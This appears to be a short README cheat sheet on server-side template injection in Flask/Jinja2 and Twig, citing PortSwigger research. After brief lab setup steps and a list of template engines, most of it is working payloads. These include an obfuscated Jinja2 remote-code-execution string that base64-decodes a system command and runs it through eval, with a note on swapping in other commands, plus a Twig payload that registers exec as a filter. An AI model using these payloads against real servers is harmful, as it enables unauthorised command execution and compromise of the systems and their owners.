# Requirements

1- apt-get install python
2- apt-get install python-pip
3- pip install flask
4- pip install jinja2

# Original Blog:
https://portswigger.net/research/server-side-template-injection

# Web Template Engines

1- FreeMarker
	Java-based template engine
2- Velocity
	Java-based template engine
3- Smarty
	PHP Template engine
4- Twig
	PHP Template engine
5- Jade 
	Node.js Template engine
6- Jinja2
	Python/Flask Template engine

# Basic Payload

{{7*7}}
{{7*'7'}}

# RCE PAYLOAD - JINJA2
`{{5096754695}}{{''}}{%+set+d+=+"eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnZFc1aGJXVWdMV0U9JykuZGVjb2RlKCkpLnJlYWQoKQ=='))"+%}{%+for+c+in+[].__class__.__base__.__subclasses__()+%}+{%+if+c.__name__+==+'catch_warnings'+%}
{%+for+b+in+c.__init__.__globals__.values()+%}+{%+if+b.__class__+==+{}.__class__+%}
{%+if+'eval'+in+b.keys()+%}
{{+b['eval'](d)+}}
{%+endif+%}+{%+endif+%}+{%+endfor+%}
{%+endif+%}+{%+endfor+%}{{''}}{{9776394213}}`

Note: Decode decode base64 string to to place system commands

# RCE PAYLOAD - TWIG
`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

# Automation tool for SSTI exploitation:
TPLMap
